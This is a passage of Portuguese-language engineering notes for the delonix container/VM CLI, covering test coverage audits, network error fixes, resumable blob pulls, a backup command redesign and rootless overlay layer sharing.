  fixou "hyperv" = hypervisor genérico); expor `generate_seed_iso` como comando standalone fora de
  `vm create`; propagar `default_vcpus`/`default_memory`/`default_backend` a `cluster kubeadm`/
  `kind: Vm` (manifesto) — hoje só o `vm create` via CLI os lê.

## A bateria mede o `--help` de tudo e EXECUTA um quarto (medido 2026-08-12)

Primeira passagem do roteiro de auditoria (`skills/delonix-auditoria`), e o número que
importa saiu logo do mapa da superfície, antes de qualquer achado: a CLI tem **245 comandos, 218
folhas invocáveis**; o `scripts/e2e.sh` verifica o `--help` de **100%** delas (um ciclo dinâmico
percorre a árvore) e **executa 55 — 25%**. Os 163 restantes têm o contrato verificado e nunca são
corridos, concentrados em `net` (45), `image` (31) e `vm` (24).

**Um verde total lê-se como «a CLI foi testada», e o que foi testado é sobretudo o texto de
ajuda.** Foi em `net` que os dois achados abaixo apareceram, ao primeiro contacto, os dois em
comandos que a bateria nunca executava.

> **O número de checks NÃO é a cobertura, e esta secção quase o disse.** A primeira versão media
> 51/23% e citava «198/198»; ao preparar a release, os checks eram já 143 e as execuções 55 (25%),
> porque outra sessão acrescentou casos entretanto. **Cita-se a fracção medida e a data, nunca o
> total do relatório** — um total que sobe faz a cobertura parecer melhor sem uma única folha
> nova exercitada. O rácio é o que interessa, e recalcula-se com o `scripts/e2e.sh` do dia.

**Achado 1 — o `ENOENT` de um spawn, outra vez.** `network node init`/`key` devolviam
``system call `spawn` failed: No such file or directory (os error 2)`` quando falta o `wg`: não
nomeia a ferramenta, não diz o pacote, e a frase manda procurar um caminho quando falta um
binário. É a classe já catalogada («o ENOENT de um `Command::status()` não é um ficheiro em
falta»), que a v0.45.0 corrigira no `vmimage::tool_package` e **reapareceu noutro sítio** — e o
remédio estava a duas funções de distância (`cmd::network` já recusava o overlay cifrado a nomear
`wireguard-tools`). Corrigido **na origem** (`delonix-net::wg`, o `map_err` dos dois spawns), para
qualquer chamador herdar, em vez de o repetir no `cmd_node`.

**Achado 2 — `network create --driver overlay --wg-ip` reportava SUCESSO sobre uma rede por
realizar.** rc=**0**, o nome no stdout, e o erro accionável rebaixado a *warning* que prometia
reconciliar «no próximo `network create`». Medido: o segundo create dá **conflict (5)**, porque
`create_overlay` não é idempotente — a promessa era falsa e a rede ficava `Realized=False` sem
comando que a salvasse. **O ficheiro já continha o argumento contra si próprio**: o braço `bridge`
faz rollback do registo com um comentário a descrever exactamente este sintoma, e o comentário do
`overlay` admite que ele, ao contrário do macvlan/ipvlan, **é realizável em rootless**. Estava no
bucket errado; passou ao padrão do `bridge` (rollback + propagar o erro).

**Gate** em `scripts/e2e.sh` (secção network), verificado pela regra do repo — 4/4 com a correcção,
**1/4 com ela revertida**. E o que passou nos dois é a lição: `check … 1 …` **não distinguia nada**,
porque o errno cru também saía 1 — o gate que apanha isto é o da MENSAGEM (contém
`wireguard-tools`, não contém `No such file`). Um gate por exit code teria ficado verde sobre o
bug. Salta com `SKIP` num host que TENHA `wg`, porque aí o caminho de falha não existe e um verde
não exercitaria nada.

**Por fechar, medido e não corrigido:**
- **`scripts/e2e.sh` não isola o estado** — nenhuma referência a `DELONIX_ROOT`, ao contrário do
  `chaos.sh`, que redirecciona os dois roots e o avisa no cabeçalho. Corre contra o estado real da
  máquina. Isolar de fora funciona (foi como esta auditoria correu), mas forçá-lo por omissão
  partiria os checks que dependem de estado real (imagens no store, holder) — é trabalho com
  análise, não uma linha.
- **`delonix backup`/`restore` não aparecem no `AGENTS.md`** (a única ocorrência da palavra é uma
  frase incidental sobre exit codes), apesar de terem página de documentação e checks no
  `e2e.sh`. Num guia que documenta tudo o resto, é o grupo que um SRE procura primeiro.
- **Os 167 comandos nunca executados.** É a fatia com melhor retorno da próxima sessão.

**Armadilhas do próprio auditor, todas apanhadas nesta passagem** (e todas já catalogadas — o que
prova que a lista serve): `$?` depois de um pipe ia reportar `rc=0` onde era 1 (era o `$?` do
`head`); um `grep "delonix <grupo>"` deu três grupos como não documentados e era falso; as páginas
`docs/comandos/netns.html` pareciam stale e têm o `Usage:` correcto lá dentro; um `head -3` no
`git status` escondeu dois ficheiros; e classificar `init` como comando de leitura gerou scaffold
na raiz do repo (`README.md`, `VMfile`, `cloud-init/`, `cluster-kind.yaml`,
`delonix-manifest.yaml` — todos removidos, nada tracked tocado). De passagem ficou provado que o
scaffold **não sobrescreve**: `already exists, skipped (use --force to overwrite)`.

## O pull de um blob recomeçava do zero, logo numa ligação lenta nunca acabava (2026-08-12)

Bug report real, medido pelo utilizador: `vm pull` de uma imagem de 276 MiB morreu ao fim de
**8m19s** com ``blob read: request or response body error``, e a ligação deste host ao ghcr media
**416 KB/s** (22,9 MB em 55s, confirmado à parte com `curl` a seguir o redirect). O que torna isto
pior do que uma falha lenta: **não havia retomada** — a tentativa seguinte recomeçava no byte zero,
por isso numa ligação abaixo de ~600 KB/s a imagem **nunca** acabava de descarregar, por mais vezes
que se tentasse. E é o primeiro comando que um administrador corre.

**A atribuição do relato ao timeout estava desactualizada, e vale registar porquê**: o tecto já é
de **4 horas** desde a v0.47.1 (`transfer_client`, escrito depois de a publicação de imagens VM ter
falhado exactamente por isto). 8m19s não é 4h — logo a causa é a ligação a cair a meio, não o
relógio. A conclusão do relato mantém-se de pé na mesma, e mais forte: contra uma queda de
conexão, um tecto maior não faz nada e só a retomada resolve.

- **A correcção vive no ÚNICO sítio por onde os dois caminhos passam** —
  `Client::blob_with_progress_capped`. `pull_from_registry_with_creds` (layers de container) e
  `pull_oci_artifact` (artefacto VM de blob único) chamam-lhe ambos, por isso não há uma segunda
  cópia da lógica a divergir. 5 tentativas com backoff (1-8s), `Range: bytes=<n>-` a partir do que
  já está em memória, e uma linha de `warn` por retomada — sem ela, um pull lento a retomar é
  indistinguível de um bloqueio, que é metade da queixa original.
- **O que torna seguro costurar dois ranges é o mesmo que no `stream_download`**: todos os
  chamadores verificam o digest no fim (config contra o manifesto, layers contra o que o CAS
  devolve, artefacto por comparação explícita). Bytes de duas respostas ou dão o hash publicado ou
  são descartados.
- **Três formas de um servidor NÃO honrar o range, e só uma é retomada**: 206 no offset pedido
  (retoma); 206 noutro offset (**respondeu a outra pergunta** — colar duplicaria o prefixo, e a
  corrupção só apareceria no digest, depois de o download inteiro estar pago); 200 (ignorou o
  header). As duas últimas recomeçam do zero. `parse_content_range` é puro e testado — é o
  guarda que impede a primeira.
- **`content_length()` numa resposta 206 é o tamanho do FRAGMENTO, não do blob.** Usá-lo faria a
  barra reiniciar contra um total a encolher. Numa retomada o tamanho inteiro vem do `/<total>` do
  `Content-Range`.
- **Um EOF limpo aquém do tamanho anunciado também é retomado.** Antes o blob voltava truncado e
  quem o apanhava era a verificação de digest do chamador — a reportar *corrupção* pelo que era uma
  ligação cortada.
- **Retry só do que faz sentido retentar**: uma falha a ABRIR a ligação só é retentada quando já há
  bytes em mãos (aí a URL e o token eram bons há segundos, logo é transporte). Na primeira
  tentativa, o mesmo erro é muito mais provavelmente um 403/404, e cinco tentativas só atrasariam
  uma resposta que o chamador já tem. Um `NotFound` nunca é retentado.

**2.º bug, encontrado ao ligar isto, e é relato falso**: o callback de progresso reporta o
**acumulado** do blob, e o adaptador do pull PARALELO somava-o ao agregado como se fosse um delta
de cada chunk. Os bytes anunciados cresciam com o **quadrado** do tamanho da layer — medido, uma
layer de 300 000 bytes anunciava **1 416 160**. `pull_oci_artifact` lê o mesmo callback
correctamente (compara `done` com o total), portanto os dois consumidores de um só callback
discordavam sobre o significado do argumento — a família
gerador-e-leitor-partilham-o-formato já catalogada aqui (`fw_rule_tail`).

**Validado ao vivo com o BINÁRIO** (não só por teste unitário), contra um registo OCI local que
corta a ligação a meio do blob, com `DELONIX_ROOT` isolado: duas quedas num blob de 6 MB, retomadas
em 3 000 000 e 4 500 000 bytes, o servidor a confirmar que cada pedido levou **só o que faltava**, e
o ficheiro final a bater com o digest publicado. E o caminho de desistência: um servidor que corta
SEMPRE falha em 15s com `gave up after 5 attempts with 5812500 of 6000000 bytes`, sem gravar nada.
Testes que **falham com a correcção revertida** — os três de retomada com `BLOB_ATTEMPTS = 1`, e o
do progresso agregado com o adaptador antigo (é preciso uma layer de vários chunks de 64 KiB: com
uma layer de um chunk só, o adaptador errado acerta por acidente).

**Gap encontrado de passagem, não corrigido** (fora do âmbito): `vm pull` e `image vm pull` aceitam
`--name`, a forma legada `image --vm pull` não — divergência entre os três pontos de entrada que o
resto do grupo mantém alinhados.

## Um `exec` logo a seguir ao `run -d` pode escrever para o sítio errado (medido 2026-08-28)

Encontrado a perseguir um check da bateria que falhava de vez em quando desde
2026-08-25 — o «os dados voltaram», do ciclo de backup. O ficheiro atribuía-o ao
tempo e trocou o `sleep 1` por uma espera por condição na LEITURA. Não era o
tempo da leitura, e não era o restore.

**Medido, seis ciclos, DOIS a falhar**: um `container exec` disparado
imediatamente a seguir a um `container run -d -v <vol>:/data` escreve o ficheiro,
**devolve 0**, e o `cat` seguinte não encontra nada. Com o container já
estabelecido, escrever num `exec` e ler noutro funciona sempre — e o ficheiro
aparece no `_data` do volume do lado do host.

A leitura é que o `run -d` devolve antes de o volume estar montado, e o `exec`
que apanha essa janela escreve para o `/data` do **rootfs** em vez de para o
volume. Não há erro: o directório existe (é o do rootfs), a escrita passa, e o
que se perde é o destino.

**A consequência no gate era enganadora de propósito.** Um backup tirado de um
volume vazio restaura um volume vazio, e o check chumbava **três passos depois**
do sítio onde o problema estava — em «os dados voltaram», que aponta para o
restore. Foi o que fez este defeito passar por flakiness de tempo durante três
dias.

**O que ficou feito**: a bateria passou a esperar que a escrita PERSISTA (escreve
e relê até bater), em vez de confiar no rc do `exec`. **O que NÃO ficou feito**: o
motor continua a aceitar o `exec` nessa janela. As duas saídas possíveis são o
`run -d` só devolver quando os mounts estão de pé, ou o `exec` recusar enquanto
não estiverem — as duas mexem na fronteira do `spawn`, que este guia já assinala
como função de risco de ~405 linhas, e nenhuma se decide de passagem. Fica com o
número ao lado: **~33% de incidência** nesta máquina, sob carga.

## `delonix backup` — seis verbos, um objecto (consolidado no ciclo da CLI)

A varredura acima encontrou-o pela ausência: um guia que documenta tudo o resto não tinha **uma
linha** sobre backup (a única ocorrência da palavra era incidental, sobre exit codes), apesar de o
grupo ter página de documentação e ciclo completo na bateria E2E. É o primeiro sítio onde um SRE
olha, e era o único onde não havia nada escrito.

**A superfície mudou, corte limpo sem aliases**: `backup <kind> <nome>` passou a
`backup create <kind> <nome>`; o `restore` de RAIZ desapareceu e é `backup restore <arquivo>`; e o
agendamento saiu de flags do backup para `backup schedule`. Entraram três verbos que **não
existiam** — `list`, `inspect` e `remove`: até aqui a pergunta «que arquivos tenho» respondia-se
com `ls` e apagar um era `rm`. A forma antiga falha com `unrecognized subcommand` (rc=2), nunca em
silêncio.

**`system backup` NÃO foi dobrado aqui, e o ADR-0020 chegou a dizer que devia ser.** Listava-o em
«várias portas para um objecto», ao lado do `backup`. Medido, são dois OBJECTOS: este grupo arquiva
UM recurso com os dados dos seus volumes; o `system backup` arquiva o **state root inteiro** de um
nó (registos, segredos, PKI de cluster, config do HTTPRoute, o registo de eventos, com as áreas
pesadas e reobtíveis opt-in). Fundi-los teria apagado uma capacidade a chamar-lhe arrumação. A
correcção está escrita no próprio ADR, e há dois checks na bateria a exigir que os dois continuem
a existir separados.

**O que o arquivo leva, e é a decisão que define o resto**: `backup create <container|pod|vm|stack>
<nome>` escreve um `.tar.gz` com o **registo** e os **DADOS dos volumes** — **não** a imagem e
**não** o rootfs, que o `backup restore` deriva por pull. A **VM é a excepção**: o disco overlay dela É o
seu estado, logo esse viaja dentro do arquivo. A regra por trás é a mesma do resto do motor: o que
tem endereço de conteúdo e se volta a obter não se duplica; o que só existe naquele host, sim.

`backup restore <arquivo>` aceita um caminho ou o **nome nu** de um arquivo em `--from` (default
`.`). **Recusa-se com o recurso a correr** e só `--force` pára, repõe e volta a arrancar — a
mesma disciplina de não destruir o que está vivo sem o operador o dizer.

**O `<kind>` deixou de ser posicional, e a razão do autor original manteve-se.** Ele exigia-o com
um argumento correcto — «restaurar pelo kind do arquivo faria `restore vm <arquivo-de-container>`
fazer em silêncio algo diferente do que foi escrito». Mas o arquivo JÁ regista o que leva, e
obrigar quem chama a repeti-lo é a repetição que a especificação tira. O compromisso: `--kind` é
**opcional e continua a recusar** uma discordância, e o kind do arquivo é **sempre impresso**. A
guarda fica; a repetição sai.

**Três funções passaram a ser partilhadas por três verbos, e uma mentia.** O `read_meta` prefixava
os erros com `restore:` — um `backup remove` apontado a um `.tar.gz` alheio respondia
«restore: … failed to read entire block», a nomear um comando que ninguém correu. Passou a
`backup:`. O `remove` recusa qualquer arquivo que este grupo não tenha escrito, verificado **lendo
o arquivo** e não o nome: um `.tar.gz` de outra ferramenta na mesma pasta seria apagado de outra
forma — e há check na bateria a confirmar que o ficheiro alheio CONTINUA lá depois da recusa (um
`remove` que recusa e apaga na mesma devolveria não-zero e teria destruído os dados à mesma).

**O que a bateria já prova** (`scripts/e2e.sh`, secção «backup / restore por recurso»), e é o
modelo a seguir para o resto da CLI: o ciclo REAL — arquivar, **destruir os dados**, repor, e
confirmar que voltaram. Um `backup` que devolve 0 não prova nada; o que prova é o conteúdo do
ficheiro depois de os dados terem sido apagados. Daí os checks olharem para DENTRO do tar
(`volumes/<vol>.tar.gz` presente, `rootfs/` **ausente** — a promessa do parágrafo acima verificada
como facto), o `--dry-run` não deixar um único ficheiro, e os caminhos de erro devolverem a classe
**4** (não existe) em vez de um 1 genérico.

**O agendamento está respondido** (esta entrada dizia «por confirmar… não sei dizer se o agendador
é interno, um timer ou uma linha de cron»): é um **timer de utilizador do systemd**, um por
recurso, instalado pelo `backup schedule`. E ele tira **também o primeiro arquivo, já** — a razão
está no código e é boa: um agendamento cuja primeira corrida é daqui a horas deixa quem o instalou
sem backup e com a impressão de ter um. `schedule` sem `--cron` nem `--max-for-day` **recusa** em
vez de se comportar como um `create` silencioso, com teste que falha se a recusa for removida.

## Containers rootless partilham as layers em vez de as copiarem (v0.59.0)

Um bug report abriu isto («os containers estão a encher o disco») com uma proposta de compressão.
A medição discordou da premissa, e é daí que sai tudo: `containers/` tinha 47 GiB e **~39 eram
duplicação byte-a-byte** — 21 containers da MESMA `kaeso-odoo:16`, cada um com a sua cópia física
de 2,1 GiB, todos os ficheiros a `nlink == 1`. Cada `run` pagava **13 s e 2,2 GiB**.

O `prepare_rootfs` fazia `export_rootfs` (cópia FLAT da imagem por container) e o caminho de
overlay existia há muito, só que **rootless-only-não**: `mount(2)` de um uid sem privilégio é
EPERM. **Mas o mount não tem de acontecer na CLI** — o `setup_rootfs` já corre dentro do clone,
como criador do userns e com caps completas sobre ele. Medido antes de escrever código: um
`mount -t overlay` sem privilégio dentro de `unshare --user --map-root-user --mount` monta, lê da
lower e escreve na upper.

- **Contrato em DISCO, não campo no `RunSpec`** — `ImageStore::prepare_overlay` deixa um
  `overlay-lowers` ao lado do `merged/` e `mount_overlay_if_marked` lê-o. Os caminhos rootless
  re-executam o binário (`--net <custom>`, `--pod`) e um struct não sobrevive a essa fronteira.
- **A partilha é segura por construção, e foi VERIFICADA**: contra um container a correr como uid
  0 no seu userns, escrever e apagar um ficheiro da lower deixou-a com o mesmo inode e os mesmos
  bytes. Copy-up antes da escrita, whiteout na remoção.
- **O `chown_tree(…, USERNS_UID_BASE)` era código morto** e nunca fez nada: `lchown` para 100000 a
  partir de um uid sem privilégio é EPERM e o `lchown_tree` engole o erro. Layers e rootfs deste
  host são uniformemente `1000:1000`, e funcionam porque o mapa rootless é `0 <euid> 1` — o uid 0
  DENTRO do namespace É quem invocou. É também isso que deixa uma layer servir todos.
- **O `build` fica no caminho flat** (`prepare_rootfs_flat`), deliberado: o `COPY` escreve na
  árvore a partir do host, o `FROM <estágio>` clona com `cp -a`, o `commit_flat_rootfs` empacota —
  tudo fora de qualquer namespace. E é o caso onde a duplicação não acumula.
- **`existing_rootfs_path` resolve os TRÊS layouts**, e o marcador é verificado PRIMEIRO: um
  container pode ter as duas formas ao mesmo tempo (um `rootfs/` legado ao lado do `merged/` novo),
  e escolher a cópia velha arrancá-lo-ia contra uma árvore que já não recebe as suas escritas.

**Um flat legado MIGRA no `start` seguinte** (`migrate_flat_to_overlay`, pós-v0.59.0 — as notas
dessa release dizem «não há migração automática» e descrevem o que era verdade quando saíram).
Um container A CORRER não se converte: o processo fez `pivot_root` para aquela árvore e tem
ficheiros abertos lá dentro, logo trocar-lhe a raiz é recriá-lo. O que se aproveita é a paragem
que já aconteceu — um `start` é o único instante em que a árvore não é de ninguém, e converter aí
não custa tempo de baixo nenhum que já não estivesse a ser pago.

- **A ORDEM é correcção e não gosto**: `rename(rootfs→upper)` (atómico) → **whiteouts** →
  `overlay-lowers`. Um rootfs flat é a imagem mais as escritas JÁ fundidas, por isso um ficheiro
  que o container APAGOU está simplesmente ausente; sem whiteout o overlay serve-o de volta da
  lower, e uma config purgada ou um segredo rotado a reaparecer é pior que o disco que se poupa.
  O `overlay-lowers.pending` é o ponto de COMMIT — renomeá-lo é o único passo que torna o
  container overlay, e tudo antes dele reverte para flat.
- **A poda dos idênticos corre DEPOIS do commit** e pode falhar à vontade: é a única parte que só
  custa espaço. É também a razão de a migração ser escrita como «apagar o que é redundante» e não
  como o aparentemente equivalente «copiar o que difere» — aquela erra para o lado do espaço,
  esta perde dados.
- **Best-effort, e nunca impede um arranque.** A imagem é resolvida LOCALMENTE (um `start` não vai
  a um registo por causa de uma optimização) e qualquer falha deixa o container a arrancar flat.
- **Corre no userns mapeado por DUAS razões independentes**: os whiteouts precisam de `CAP_MKNOD`
  (medido no spike: `mknod c 0 0` funciona dentro de `unshare --user --map-root-user` e o
  overlayfs honra-o), e um rootfs flat pode ter ficheiros de SUBUID mapeado — tudo o que o
  container escreveu como uid≠0 — que o uid que invoca não consegue mover nem apagar.
- **Validado com o binário 0.58.0 REAL** (o backup da instalação), para o container flat ser
  genuíno e não fabricado: escrita própria preservada, `/etc/alpine-release` apagado lá dentro a
  NÃO ressuscitar (whiteout `c--------- 0, 0` em disco), 9 MB → 1 MB, e o 2.º start no-op.

**Dois defeitos que só a validação revelou**: o `commit` passou a ler por `/proc/<pid>/root`, que
inclui os MOUNTS do container — o empacotador descia pelo procfs real e falhava com `Permission
denied` (se acabasse, publicava um retrato do kernel do host numa imagem); `pack_rootfs_tar`
mantém `proc`/`sys`/`dev` vazios. E o `Command::spawn`/`pre_exec` que faz deadlock com o handshake
de userns — ver a entrada na classe «X não é Y».

**`cp`/`commit` num container overlay PARADO** (`__ovlhold` + `reexec_mapped_hold`): o `merged/` é
um directório vazio até alguém montar. Em vez de copiar a árvore para um temporário (a cópia que
acabámos de eliminar) ou refazer a fusão do overlayfs em userspace (2.ª implementação da semântica
do kernel), um processo segura o mount na sua namespace e o resto lê por `/proc/<pid>/root` — a
MESMA porta do container vivo, zero mudanças a jusante. O `HeldChild` mata **e reapa** no `Drop`:
sem o reap, um `serve docker-api` acumula zombies, defeito que esse caminho já pagou.

**Medido**: 6 containers da mesma imagem em 1 MiB cada contra 17 MiB de layers; no host real,
`containers/` de **47 para 7,2 GiB**. **Não validado**: a bateria `scripts/e2e.sh` não correu
nesta série (corre contra o estado real e o host tinha produção viva). O ADR-0016 fecha a
pergunta do filesystem que deu origem a tudo.

**Armadilha de método que vale por si**: os containers só passam a partilhar quando o binário EM
USO é o novo. Durante esta série o host criou containers flat com o `--version` a dizer o número
certo — ver «duas builds com a mesma versão não são a mesma build».
